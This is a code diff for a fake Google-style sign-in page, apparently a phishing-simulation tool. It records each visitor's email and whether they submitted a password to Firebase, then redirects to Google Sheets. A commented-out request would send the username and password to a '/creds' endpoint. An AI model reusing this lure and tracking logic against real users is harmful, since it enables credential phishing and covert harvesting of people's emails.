@@ -26,10 +26,11 @@ function doEmailStep() {
             $('.invalid-email').css('display', 'none')
             $('#prev-email').text($('#email-input').val())
 
-			var username = $('#email-input').val()
-			track('entered_email', username)
-            firebase.analytics().setUserProperties({ email: username });
-            toPasswordPage()
+            var username = $('#email-input').val()
+            createUser(username, () => {
+                toPasswordPage()
+            })
+            // toPasswordPage()
         } else {
             $('#email-input').addClass('g-input-invalid')
             $('.invalid-email').css('display', 'block')
@@ -42,19 +43,16 @@ function doPasswordStep() {
     var username = $('#email-input').val()
     // var password = $('#password-input').val()
 
-	track('submitted_password', username)
-    firebase.analytics().setUserProperties({ failed: true });
+    savePassword(username, (error) => {
+        if (error) {
 
-    save(username, (error) => {
-		if(error) {
-
-		} else {
-			window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
-		}
-	});
+        } else {
+            window.location.replace("https://docs.google.com/spreadsheets/u/0/?tgif=d")
+        }
+    });
 
     // //Redirect to myaccount.google
-  //
+    //
 
     // var xhr = new XMLHttpRequest();
     // xhr.open("GET", "/creds?username="+ username +"&password="+ password, true);
@@ -125,8 +123,8 @@ function attachEvents() {
 
 window.onload = function() {
     onReady()
-	var username = $('#email-input').val()
-	track('viewed_fake_page', username)
+    var username = $('#email-input').val()
+    track('viewed_fake_page', username)
     attachEvents()
 }
 
@@ -138,19 +136,39 @@ function track(event, email) {
 }
 
 
-function save(email, callback) {
+function savePassword(email, callback) {
+
+    track('submitted_password', email)
+    firebase.analytics().setUserProperties({ email: email, failed: true });
+
     // A post entry.
     var userData = {
-        email: email,
+        gavePassword: true,
         // password: password,
     };
 
-    // Get a key for a new Post.
-    var newUserKey = firebase.database().ref().child('users').push().key;
+    firebase.firestore()
+        .collection("users")
+        .doc(email)
+        .set(userData)
+        .then(callback)
+}
 
-    // Write the new post's data simultaneously in the posts list and the user's post list.
-    var updates = {};
-    updates['/users/' + newUserKey] = userData;
 
-    return firebase.database().ref().update(updates, callback);
+function createUser(email, callback) {
+
+    track('entered_email', email)
+    firebase.analytics().setUserProperties({ email: email, failed: false });
+
+    // A post entry.
+    var userData = {
+        gavePassword: false,
+        // password: password,
+    };
+
+    firebase.firestore()
+        .collection("users")
+        .doc(email)
+        .set(userData)
+        .then(callback)
 }
